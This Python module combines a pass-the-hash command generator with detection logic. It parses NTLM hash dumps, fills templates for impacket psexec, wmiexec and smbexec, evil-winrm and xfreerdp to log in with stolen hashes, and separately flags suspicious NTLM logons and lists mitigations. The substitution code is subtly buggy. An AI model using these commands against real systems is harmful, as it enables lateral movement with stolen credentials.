"""Pass-the-Hash Core"""
import hashlib,json,re,os
from datetime import datetime

class NTLMAnalyzer:
    def parse_hash(self,hash_string):
        """Parse user:rid:lm:ntlm format"""
        parts=hash_string.split(":")
        if len(parts)>=4:
            return {"user":parts[0],"rid":parts[1],"lm_hash":parts[2],"ntlm_hash":parts[3].strip(),
                    "lm_disabled":parts[2]=="aad3b435b51404eeaad3b435b51404ee"}
        return {"error":"Invalid hash format","expected":"user:rid:lm:ntlm"}
    
    def generate_ntlm(self,password):
        """Generate NTLM hash from password"""
        return hashlib.new("md4",password.encode("utf-16le")).hexdigest()
    
    def compare_hashes(self,hash1,hash2):
        return {"match":hash1.lower()==hash2.lower(),"hash1":hash1[:8]+"...","hash2":hash2[:8]+"..."}

class PTHSimulator:
    TECHNIQUES={
        "psexec":{"tool":"impacket-psexec","command":"psexec.py DOMAIN/user@target -hashes lm:ntlm","access":"SYSTEM"},
        "wmiexec":{"tool":"impacket-wmiexec","command":"wmiexec.py DOMAIN/user@target -hashes lm:ntlm","access":"User"},
        "smbexec":{"tool":"impacket-smbexec","command":"smbexec.py DOMAIN/user@target -hashes lm:ntlm","access":"SYSTEM"},
        "evil_winrm":{"tool":"evil-winrm","command":"evil-winrm -i target -u user -H ntlm_hash","access":"User"},
        "rdp_pth":{"tool":"xfreerdp","command":"xfreerdp /v:target /u:user /pth:ntlm_hash","access":"User"},
    }
    
    def list_techniques(self): return {k:{"tool":v["tool"],"access":v["access"]} for k,v in self.TECHNIQUES.items()}
    
    def generate_command(self,technique,domain,user,target,ntlm_hash):
        t=self.TECHNIQUES.get(technique)
        if not t: return {"error":"Unknown technique"}
        cmd=t["command"].replace("DOMAIN",domain).replace("user",user).replace("target",target).replace("ntlm",ntlm_hash)
        return {"technique":technique,"command":cmd,"tool":t["tool"],"note":"For authorized testing only"}

class PTHDetector:
    EVENT_IDS={"4624":"Logon","4625":"Failed Logon","4648":"Explicit Credentials","4672":"Special Privileges"}
    
    def analyze_logon_events(self,events):
        suspicious=[]
        for e in events:
            if e.get("logon_type")==3 and e.get("auth_package")=="NTLM":
                if e.get("key_length")==0:
                    suspicious.append({**e,"alert":"Possible PTH - NTLM with 0 key length","severity":"HIGH"})
        return suspicious
    
    def recommend_mitigations(self):
        return ["Enable Credential Guard","Restrict NTLM authentication","Use Protected Users group",
                "Implement LAPS for local admin passwords","Enable LSA protection","Disable LM hashes",
                "Use Admin Tier Model","Monitor Event ID 4624 with NTLM auth","Implement PAM/JIT access"]
